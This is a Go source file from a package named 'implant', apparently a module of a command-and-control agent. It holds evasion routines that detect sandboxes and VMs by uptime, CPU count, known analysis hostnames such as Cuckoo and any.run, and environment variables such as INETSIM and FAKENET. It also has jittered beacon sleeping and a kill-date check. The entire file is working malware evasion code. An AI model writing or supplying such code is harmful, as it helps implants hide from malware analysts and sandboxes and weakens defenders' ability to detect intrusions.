package implant

import (
	"os"
	"runtime"
	"strings"
	"time"
)

// CheckSandbox performs basic sandbox/VM detection.
// Returns true if a sandbox is suspected.
func CheckSandbox() bool {
	checks := []func() bool{
		checkUptime,
		checkCPUCount,
		checkHostname,
		checkEnvVars,
	}

	suspiciousCount := 0
	for _, check := range checks {
		if check() {
			suspiciousCount++
		}
	}

	// If 2+ checks trigger, likely a sandbox
	return suspiciousCount >= 2
}

// checkUptime flags if system uptime is less than 5 minutes (common in sandboxes).
func checkUptime() bool {
	// On Linux, check /proc/uptime
	if runtime.GOOS == "linux" {
		data, err := os.ReadFile("/proc/uptime")
		if err != nil {
			return false
		}
		parts := strings.Fields(string(data))
		if len(parts) > 0 {
			// Parse seconds
			for _, c := range parts[0] {
				if c == '.' {
					break
				}
				if c < '0' || c > '9' {
					return false
				}
			}
			// Simple check: if uptime string is short (< 4 chars before dot), < 1000 seconds
			dotIdx := strings.Index(parts[0], ".")
			if dotIdx > 0 && dotIdx < 4 {
				return true // Less than ~16 minutes
			}
		}
	}
	return false
}

// checkCPUCount flags if fewer than 2 CPUs (common in VMs/sandboxes).
func checkCPUCount() bool {
	return runtime.NumCPU() < 2
}

// checkHostname flags known sandbox hostnames.
func checkHostname() bool {
	hostname, err := os.Hostname()
	if err != nil {
		return false
	}

	hostname = strings.ToLower(hostname)
	sandboxNames := []string{
		"sandbox", "malware", "virus", "sample", "test",
		"analysis", "cuckoo", "vm-", "vmware", "virtualbox",
		"any.run", "hybrid", "joe", "tria.ge",
	}

	for _, name := range sandboxNames {
		if strings.Contains(hostname, name) {
			return true
		}
	}
	return false
}

// checkEnvVars flags known sandbox environment variables.
func checkEnvVars() bool {
	sandboxVars := []string{
		"SANDBOX", "MALWARE", "VIRUS", "CUCKOO",
		"INETSIM", "FAKENET",
	}

	for _, v := range sandboxVars {
		if os.Getenv(v) != "" {
			return true
		}
	}
	return false
}

// SleepWithJitter sleeps for a randomized duration.
func SleepWithJitter(sleepSec, jitterPct int) {
	duration := jitteredDuration(sleepSec, jitterPct)
	time.Sleep(duration)
}

// jitteredDuration calculates a jittered sleep duration.
func jitteredDuration(sleepSec, jitterPct int) time.Duration {
	if jitterPct <= 0 || sleepSec <= 0 {
		return time.Duration(sleepSec) * time.Second
	}

	// Use nanosecond clock as simple entropy source (no crypto/rand to reduce binary size)
	ns := time.Now().UnixNano()
	variance := int64(sleepSec) * int64(jitterPct) / 100
	if variance == 0 {
		variance = 1
	}

	offset := (ns % (2 * variance)) - variance
	total := int64(sleepSec) + offset

	if total < 1 {
		total = 1
	}

	return time.Duration(total) * time.Second
}

// CheckKillDate returns true if the kill date has passed.
func CheckKillDate(killDate string) bool {
	if killDate == "" {
		return false
	}

	t, err := time.Parse("2006-01-02", killDate)
	if err != nil {
		return false
	}

	return time.Now().After(t)
}
